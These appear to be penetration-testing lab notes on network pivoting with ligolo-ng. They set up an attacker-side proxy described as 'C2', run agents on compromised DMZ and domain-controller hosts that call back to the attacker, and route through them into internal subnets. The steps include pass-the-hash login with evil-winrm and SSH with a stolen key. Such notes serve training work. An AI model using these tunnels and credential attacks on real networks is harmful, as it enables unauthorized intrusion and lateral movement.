# Download the files
## Agent File:
```
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```
```
tar -xvf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```
```
sudo mv agent lin-agent
```
## Proxy File
```
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```
```
tar -xvf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```
```
sudo mv proxy lin-proxy
```
# Ligolo-ng
## Attack Host
These commands create a tun interface on the Proxy Server (C2).
```
sudo ip tuntap add user root mode tun ligolo
```
```
sudo ip link set ligolo up
```
1. On your machine get ligolo running
```
./lin-proxy -selfcert
```
```
./lin-proxy -selfcert -laddr 0.0.0.0:443 
```
2. Transfer lin-agent to DMZ
## DMZ (10.129.202.17 172.16.8.120)
```
chmod +x lin-agent
```
```
./lin-agent -connect 10.10.14.74:11601 -ignore-cert
```
3. Connection back to our Attack Machine
4. You should see the connection get grabbed by the ligolo tool if the commands were ran successfully on target machine.
5. Next we need to add the internal subnet of the DMZ Host machine to be able to access it, which is 172.16.8.0/32 (/16 did not work so modify it to /32 or /24 until you can add the network and not get an error) then enter start command within the ligolo termnial to start the tunnel to DMZ
```
sudo ip route add 172.16.8.0/32 dev ligolo
```
```
ligolo-ng » session
```
```
? Specify a session : 1 - root@dmz01 - 10.129.202.17:43968
[Agent : root@dmz01] » start
[Agent : root@dmz01] » INFO[0722] Starting tunnel to root@dmz01
```
6. Now we can access any `ip` on the internal network `172.16.8.0/24` from our attack box without the need to input `proxychains`
```
evil-winrm -i 172.16.8.3 -u administrator -H fd1f7e5564060258ea787ddbb6e6afa2
```
# Double Pivoting
To Double Pivot and access the Ubuntu Host (only accessible from Windows Machine DC) we need to have a ligolo session from the Windows DC host (172.16.8.3)
## Attack Host
1. Download agent.exe
```
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.1-alpha/ligolo-ng_agent_0.7.1-alpha_windows_amd64.zip
```
```
agent.exe
```
2. Transfer agent.exe to the Windows Host P1
3. On the attacker machine, we have to create a listener to send the second host traffic to the proxy server and connect through a tunnel:
```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```
```
listener_list
```
## Windows DC Host machine 
4. We need to execute the agent.exe file and input the DMZ internal IP address (which is 172.16.8.120, while we added a listener on the same port we will get a new session on ligolo from the Windows DC
```
PS C:\users> ./agent.exe -connect 172.16.8.120:11601 -ignore-cert
```
## Attack Host
5. session created
```
? Specify a session : 2 - INLANEFREIGHT\Administrator@DC01 - 127.0.0.1:47236
```
6. Now we need to add the internal network 172.16.9.0 that is only visible to the Windows DC Host in order to access it from our machine (Ubuntu Host machine has the ip 172.16.9.25)
```
sudo ip route add 172.16.9.0/24 dev ligolo
```
```
ip route
```
7. You should see the following ip routes
```
172.16.8.0/24 dev ligolo scope link 
172.16.9.0/24 dev ligolo scope link
```
8. We can now access the 172.16.9.0/24 network from our host machine
```
ssh -i ssmallsadm_id-rsa ssmallsadm@172.16.9.25
```
**Connection established**
